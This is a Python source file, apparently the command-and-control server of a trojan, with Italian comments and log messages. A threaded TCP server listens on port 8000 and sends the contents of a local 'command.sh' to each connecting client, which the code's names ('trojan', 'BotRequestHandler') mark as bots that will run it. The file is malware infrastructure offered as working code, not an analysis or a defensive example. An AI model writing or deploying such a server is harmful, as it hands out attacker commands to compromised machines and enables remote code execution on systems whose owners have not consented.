# trojan_execution_server.py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socketserver
import threading
import os

class BotRequestHandler(socketserver.BaseRequestHandler):
    def handle(self):
        client_ip = self.client_address[0]
        thread_name = threading.current_thread().name
        print(f"[{thread_name}] Connessione ricevuta da: {client_ip}")

        try:
            # Cerca ed invia "command.sh" se esiste nella directory corrente
            if os.path.exists("command.sh"):
                with open("command.sh", "r") as f:
                    script_content = f.read()
                print(f"[{thread_name}] Inviando script command.sh al client...")
                self.request.sendall(script_content.encode('utf-8'))
            else:
                error_message = "SCRIPT_NOT_FOUND"
                print(f"[{thread_name}] File command.sh non trovato.")
                self.request.sendall(error_message.encode('utf-8'))

        except Exception as e:
            print(f"[{thread_name}] Errore durante invio script: {e}")
        finally:
            print(f"[{thread_name}] Connessione chiusa con: {client_ip}")


def main():
    HOST, PORT = "0.0.0.0", 8000
    socketserver.ThreadingTCPServer.allow_reuse_address = True

    try:
        with socketserver.ThreadingTCPServer((HOST, PORT), BotRequestHandler) as server:
            print(f"Server in ascolto su {HOST}:{PORT}")
            print("Premi CTRL+C per terminare il server.")
            server.serve_forever()
    except KeyboardInterrupt:
        print("\nInterruzione richiesta. Arresto del server...")
    finally:
        print("Server arrestato.")


if __name__ == "__main__":
    main()
